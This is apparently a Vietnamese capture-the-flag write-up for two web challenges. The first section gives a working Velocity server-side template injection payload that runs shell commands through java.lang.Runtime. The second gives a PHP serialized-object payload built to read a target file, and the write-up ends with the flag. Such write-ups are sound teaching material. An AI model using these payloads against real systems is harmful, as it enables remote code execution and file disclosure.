# Web 1: IsH0wSp33d 

![331861960-5be8fafd-efaa-4808-a969-b0ea199197fb](https://github.com/j10nelop/Pr1vate/assets/152776722/c040f3cf-8289-47b0-8070-067431864946)


1. Initial reconnaissance:

+ đầu tiên trong web khi nhập ta có được 1 số thông tin về template thông báo not found search bar

![331866162-a8e83a5f-2fbf-49f3-a3cd-639b3ba3e774](https://github.com/j10nelop/Pr1vate/assets/152776722/ce74e7e4-74b9-424c-8b94-03da382fc542)


=> điều kì lạ xảy ra khi ta không nhập 1 thông tin gì vào mục search thì nó hiện ra thông tin là **hello, velocity!**

![331871351-c5b5bc02-3753-4552-a688-40f12ee36bb7](https://github.com/j10nelop/Pr1vate/assets/152776722/7dbb24da-2ac9-455b-a1c1-2787ddcb5188)



+ lúc đầu do chưa biết rõ về thông tin lỗ hổng đó nên mình dùng thử brupsuite pro quét qua cái test case trong đó thì mình  tìm ra được lỗ hổng ssti và test case của nó được encode url

![331871403-242ac0f1-da81-44af-abef-22c058f43dd7](https://github.com/j10nelop/Pr1vate/assets/152776722/98ebf14b-24f8-46f3-982b-14287195b037)


sau khi decode thì mình được 1 payload có dạng 

![331871499-6c22eb27-a249-44b9-9e1e-829641d49058](https://github.com/j10nelop/Pr1vate/assets/152776722/f21c3d2e-5c71-41b7-9311-f3985298f33b)


sau khi lọc ra test thì ta được payload 

```
#set ($a=7*7) ${a}
```

![331871571-39e282b7-d9de-4310-aa49-944b68f5209d](https://github.com/j10nelop/Pr1vate/assets/152776722/efc9f052-62f0-45b6-b8ae-666ada079507)


=> có vẻ đoán chắc đây là lỗ hổng ssti nhưng ở dạng velocity template sau khi được search 

payload: solve 

```
#set($engine="string")#set($run=$engine.getClass().forName("java.lang.Runtime"))#set($runtime=$run.getRuntime())#set($proc=$runtime.exec("ls -al"))#set($null=$proc.waitFor())#set($istr=$proc.getInputStream())#set($chr=$engine.getClass().forName("java.lang.Character"))#set($output="")#set($string=$engine.getClass().forName("java.lang.String"))#foreach($i in [1..$istr.available()])#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))#end$output
```


# Web 2: web-secu-challenge 

![333806229-6331738d-8c6b-4a56-8f67-6038fc6fcd45](https://github.com/j10nelop/Pr1vate/assets/152776722/df6a5651-9f47-49c1-bfc8-8bb2a12b64ad)



payload 

```
<?php

// Define the XYZ class
class XYZ {
    public $source;

    public function __toString() {
        return highlight_file($this->source, true);
    }

    public function show() {
        echo $this->source;
    }
}

// Create an instance of the XYZ class
$obj = new XYZ();
$obj->source = 'target.php';

// Serialize the object
$serialized = serialize([$obj]);

// Output the serialized data
echo $serialized;

?>

```

![333806259-7b11fc06-abb6-4f0b-a83e-bb9596201dd3](https://github.com/j10nelop/Pr1vate/assets/152776722/faf512e5-0d61-43a5-bca0-fe6010c336eb)


=> flag: Fusec{flag-418e9146}
